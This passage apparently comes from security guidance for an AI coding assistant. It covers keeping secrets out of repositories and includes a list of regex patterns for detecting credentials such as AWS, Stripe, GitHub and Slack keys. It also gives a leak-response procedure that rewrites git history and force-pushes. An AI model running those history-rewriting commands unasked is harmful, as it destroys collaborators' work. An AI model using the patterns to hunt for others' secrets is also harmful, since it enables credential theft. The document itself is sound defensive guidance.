- run: docker build --build-arg SECRET_KEY=${{ secrets.SECRET_KEY }} .

# 🔴 NEVER — secret in a workflow comment
# DB_PASS = mypassword123   ← comments are still plaintext in the file
```

**GitHub Actions secrets rules:**
- Store all credentials under **Settings → Secrets and variables → Actions**
- Use **environment secrets** for prod/staging separation via `environment:` in the job
- Use **OIDC federation** for AWS, GCP, and Azure — eliminates the need for static keys entirely
- Rotate secrets regularly; audit and remove secrets no longer in use
- Never pass secrets as `--build-arg` to Docker builds
- Never `echo` or `print` a secret value, even for debugging

### 17.6 Credential Patterns Claude Detects and Blocks

Claude must refuse to commit any file containing these patterns:

```
AKIA[0-9A-Z]{16}                    AWS Access Key ID
sk-[a-zA-Z0-9]{20,}                 OpenAI / Stripe-style secret key
sk_live_[a-zA-Z0-9]{24,}            Stripe live secret key
pk_live_[a-zA-Z0-9]{24,}            Stripe live publishable key (less critical but flag it)
SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}   SendGrid API key
xoxb-[0-9]+-[0-9]+-[a-zA-Z0-9]+    Slack bot token
xoxp-[0-9]+-[0-9]+-[a-zA-Z0-9]+    Slack user token
ghp_[a-zA-Z0-9]{36}                 GitHub Personal Access Token
ghr_[a-zA-Z0-9]{36}                 GitHub refresh token
github_pat_[a-zA-Z0-9_]{82}         GitHub fine-grained PAT
AIza[0-9A-Za-z-_]{35}               Google API key
ya29\.[0-9A-Za-z\-_]+               Google OAuth token
-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----   Any private key block
"private_key":\s*"-----BEGIN        Service account JSON private key
[a-z0-9]{32,}@[a-z]+\.iam\.gserviceaccount\.com       GCP service account email with key context
AccountKey=[a-zA-Z0-9+/=]{88}       Azure Storage Account Key
password\s*=\s*[^\s${\'"]{4,}       Plaintext password assignment in config
passwd\s*=\s*[^\s${\'"]{4,}         Same
DB_PASS(?:WORD)?\s*=\s*[^\s${\'"]{4,}  Database password env var
```

### 17.7 If Credentials Are Accidentally Pushed — Emergency Response

> Deleting the file and pushing a fix commit is **not enough**. The credential exists in git
> history and is fully accessible to anyone who can clone the repo.

**Step 1 — Rotate the credential FIRST, before anything else:**
```
AWS key:      IAM Console → Access keys → Deactivate + Delete → Create new
GitHub PAT:   Settings → Developer settings → Personal access tokens → Delete
Stripe key:   Dashboard → Developers → API keys → Roll key
Database:     ALTER USER myuser WITH PASSWORD 'new-strong-password';
GCP key:      IAM → Service accounts → Keys → Delete old → Add new key
Slack token:  api.slack.com/apps → OAuth & Permissions → Revoke
Any other:    Immediately invalidate at the source before doing anything else
```

**Step 2 — Scrub git history (after credential is already rotated):**
```bash
# Option A: git-filter-repo (recommended for modern git)
pip install git-filter-repo

# Remove a specific file from all history
git filter-repo --path path/to/leaked-file --invert-paths

# Replace a specific leaked string everywhere in history
echo '<EXAMPLE-SECRET-KEY>==>REMOVED' > replacements.txt
git filter-repo --replace-text replacements.txt

# Force push all branches and tags
git push origin --force --all
git push origin --force --tags

# Option B: BFG Repo Cleaner (simpler for replacing text)
# Download bfg.jar from https://rtyley.github.io/bfg-repo-cleaner/
echo '<EXAMPLE-SECRET-KEY>' > bad-strings.txt
java -jar bfg.jar --replace-text bad-strings.txt
git reflog expire --expire=now --all
git gc --prune=now --aggressive
git push --force --all
```

**Step 3 — Notify all collaborators:**
```
Force push has rewritten history. Everyone must:
  1. Delete their local clone
  2. Re-clone from origin
  3. Do NOT git pull — it will re-introduce the bad history
```

**Step 4 — Audit for unauthorized use:**
```bash
# AWS — check CloudTrail for usage of the leaked key
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=AccessKeyId,AttributeValue=<EXAMPLE-AWS-ACCESS-KEY-ID> \
  --start-time "2024-01-01T00:00:00Z"

# GCP — check audit logs in Cloud Console
# Logging → Logs Explorer → filter by service account email

# GitHub — org audit log
# github.com/organizations/<org>/settings/audit-log
# Filter by the leaked PAT's activity

# General: check your SIEM / APM for requests using the leaked credential
# Look for unusual geographic locations, high API usage, unauthorized resource access
```

**Step 5 — Enable GitHub Push Protection (prevents future incidents):**
```
Repository → Settings → Security → Code security
→ Enable "Secret scanning"
→ Enable "Push protection" ← blocks pushes containing known secret patterns BEFORE they land
```

### 17.8 Correct Credential Delivery Patterns

| Scenario | Correct Pattern | Never Do |
|---|---|---|
| Local development | `.env` file loaded by `dotenv` (in `.gitignore`) | Hardcode in source files |
| CI/CD | GitHub Actions Secrets, GitLab CI Variables | Hardcode in workflow YAML |
| Production runtime | AWS Secrets Manager, HashiCorp Vault, GCP Secret Manager | Environment variables baked into image |
| Kubernetes | `external-secrets-operator` syncing from Vault/ASM | `kubectl create secret` with value in shell history |
| Docker build | Build without secrets; inject at runtime via `--env-file` | `--build-arg SECRET=value` |
| Terraform | `TF_VAR_` env vars or Vault provider at runtime | Committed `.tfvars` with real values |
| GitHub Actions → Cloud | OIDC federation (zero static keys) | Repository secret with long-lived IAM key |
